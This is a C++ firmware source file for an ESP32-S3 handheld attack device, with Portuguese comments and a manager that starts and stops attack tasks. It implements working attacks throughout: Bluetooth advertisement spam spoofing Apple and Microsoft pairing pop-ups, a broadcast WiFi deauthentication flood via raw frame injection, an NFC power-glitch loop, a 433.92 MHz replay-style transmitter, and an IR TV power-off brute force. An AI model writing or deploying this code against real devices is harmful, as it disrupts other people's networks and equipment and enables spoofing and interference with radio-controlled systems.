#include "attacks_manager.h"
#include "main.h" // Modos: MOD_NONE, MOD_CC1101, etc.
#include "fault_mosfet.h"

// External Dependencies
#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>

extern void enable_module(int mod);

// --- Configuração IR ---
#define IR_TX_PIN 47 // S3 IR Pin
IRsend irsend(IR_TX_PIN);

// --- Globals ---
AttackType current_attack = ATTACK_NONE;
TaskHandle_t attack_task_handle = NULL;
volatile bool stop_requested = false;

// =================================================================================
// 1. BLE Spam (NimBLE) - 'Swift Pair' e 'Continuity' Spam
// =================================================================================
void task_ble_spam(void *pvParameters) {
    Serial.println("[ATTACK] Iniciando BLE Spam (Swift/Continuity)...");
    enable_module(MOD_BLE); 
    
    NimBLEDevice::init("MonsterS3");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    
    // Payloads Rotativos
    // 1. Microsoft Swift Pair
    uint8_t adv_swift[] = { 0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80 };
    // 2. Apple Continuity (AirPods Pop-up spoof)
    uint8_t adv_apple[] = { 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    int mode = 0;
    
    while (!stop_requested) {
        NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
        
        if (mode == 0) {
            oAdvertisementData.setManufacturerData(std::string((char*)adv_swift, sizeof(adv_swift)));
        } else {
            oAdvertisementData.setManufacturerData(std::string((char*)adv_apple, sizeof(adv_apple)));
        }
        
        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->start();
        delay(500); // 500ms broadcast
        pAdvertising->stop();
        
        mode = !mode; // Alterna
        delay(100);
    }
    
    NimBLEDevice::deinit();
    Serial.println("[ATTACK] BLE Spam Parado.");
    vTaskDelete(NULL);
}

// =================================================================================
// 2. WiFi Deauth (Raw Injection)
// =================================================================================
void task_wifi_deauth(void *pvParameters) {
    Serial.println("[ATTACK] Iniciando WiFi Deauth (Broadcast)...");
    // enable_module(MOD_NONE); // WiFi é interno
    
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
    
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x00, 0x00, // Frame Control (Deauth)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest: Broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: filled dynamically
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: filled dynamically
        0x00, 0x00, 0x01, 0x00  // Seq
    };

    // Gera um BSSID fake aleatório para o ataque
    uint8_t fakeMac[6];
    esp_fill_random(fakeMac, 6);
    memcpy(&deauthPacket[10], fakeMac, 6);
    memcpy(&deauthPacket[16], fakeMac, 6);

    while (!stop_requested) {
        // Varre canais 1, 6, 11 (Principais) + Aleatórios
        int channels[] = {1, 6, 11, random(1, 14)};
        for (int i = 0; i < 4; i++) {
            esp_wifi_set_channel(channels[i], WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
            delay(50); // Burst
            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
            delay(50);
            if (stop_requested) break;
        }
    }
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    Serial.println("[ATTACK] WiFi Deauth Parado.");
    vTaskDelete(NULL);
}

// =================================================================================
// 3. NFC Fault (Glitch Loop)
// =================================================================================
void task_nfc_fault(void *pvParameters) {
    Serial.println("[ATTACK] Iniciando NFC Fault Loop...");
    enable_module(MOD_PN532);
    
    // Loop de tentativas de glitch
    while (!stop_requested) {
        // Tenta ativar o campo (simulado com delay, pois PN532 lib inicia em setup)
        // Aqui o foco é o GLITCH no power line
        fault_pulse_trigger(); // Pulso 5ms no MOSFET
        
        // Espera recarga
        delay(250); 
    }
    
    Serial.println("[ATTACK] NFC Fault Parado.");
    vTaskDelete(NULL);
}

// =================================================================================
// 4. SubGHz Replay (CC1101)
// =================================================================================
void task_subghz_replay(void *pvParameters) {
    Serial.println("[ATTACK] Iniciando SubGHz Replay (433.92MHz)...");
    enable_module(MOD_CC1101);
    
    // Init CC1101 (Pinos definidos no platformio.ini/main.h)
    // CS=7, GDO0=6, SCK=12, MISO=13, MOSI=11
    ELECHOUSE_cc1101.setSpiPin(12, 13, 11, 7);
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.SetTx();
    
    // Sinal Exemplo (Portão Genérico OOK)
    byte signal[] = {
        0b10101010, 0b10101010, 0b10101010, 0b10000000 
    };
    
    while (!stop_requested) {
        ELECHOUSE_cc1101.SendData(signal, sizeof(signal));
        delay(100); // 100ms intervalo
    }
    
    ELECHOUSE_cc1101.SetRx(); // Idle/Receive
    Serial.println("[ATTACK] SubGHz Parado.");
    vTaskDelete(NULL);
}

// =================================================================================
// 5. IR Brute Force (TV-B-Gone Style)
// =================================================================================
void task_ir_brute(void *pvParameters) {
    Serial.println("[ATTACK] Iniciando IR Brute Force (TV-B-Gone)...");
    enable_module(MOD_NONE); // IR não precisa de módulo power high, apenas pino
    
    irsend.begin();
    
    // Lista de Códigos de Desligar (Simplificada para demo)
    // Sony, NEC, RC5
    struct IrCode {
        uint32_t data;
        int bits;
        int protocol; // 0=Sony, 1=NEC, 2=RC5
    };
    
    IrCode codes[] = {
        {0xA90, 12, 0},      // Sony Power
        {0x20DF10EF, 32, 1}, // NEC (LG/Samsung genérico)
        {0x0C, 12, 2}        // RC5 Power
    };
    
    int i = 0;
    while (!stop_requested) {
        IrCode c = codes[i];
        if (c.protocol == 0) irsend.sendSony(c.data, c.bits);
        else if (c.protocol == 1) irsend.sendNEC(c.data, c.bits);
        else if (c.protocol == 2) irsend.sendRC5(c.data, c.bits);
        
        delay(100);
        
        i++;
        if (i >= 3) {
            i = 0;
            delay(1000); // Pausa após ciclo completo
        }
    }
    
    Serial.println("[ATTACK] IR Brute Parado.");
    vTaskDelete(NULL);
}

// =================================================================================
// Gerenciador
// =================================================================================

void attacks_init() {
    stop_requested = false;
    current_attack = ATTACK_NONE;
    Serial.println("[MANAGER] Attacks Manager Initialized");
}

void attacks_stop() {
    if (current_attack != ATTACK_NONE) {
        stop_requested = true;
        delay(200); // Wait for task loop to break
        
        if (attack_task_handle != NULL) {
             // Força kill se travado
             vTaskDelete(attack_task_handle);
             attack_task_handle = NULL;
        }
        
        enable_module(MOD_NONE);
        current_attack = ATTACK_NONE;
        Serial.println("[MANAGER] Todos ataques parados.");
    }
}

void attacks_start(AttackType type) {
    if (current_attack == type) return;
    attacks_stop(); // Para anterior
    
    stop_requested = false;
    current_attack = type;
    
    if (type == ATTACK_BLE_SPAM) {
        xTaskCreate(task_ble_spam, "Att_BLE", 4096, NULL, 1, &attack_task_handle);
    } else if (type == ATTACK_WIFI_DEAUTH) {
        xTaskCreate(task_wifi_deauth, "Att_WiFi", 4096, NULL, 1, &attack_task_handle);
    } else if (type == ATTACK_NFC_FAULT) {
        xTaskCreate(task_nfc_fault, "Att_NFC", 3072, NULL, 1, &attack_task_handle);
    } else if (type == ATTACK_SUBGHZ_REPLAY) {
        xTaskCreate(task_subghz_replay, "Att_SubG", 4096, NULL, 1, &attack_task_handle);
    } else if (type == ATTACK_IR_BRUTE) {
        xTaskCreate(task_ir_brute, "Att_IR", 3072, NULL, 1, &attack_task_handle);
    }
}

bool attacks_is_running() {
    return current_attack != ATTACK_NONE;
}
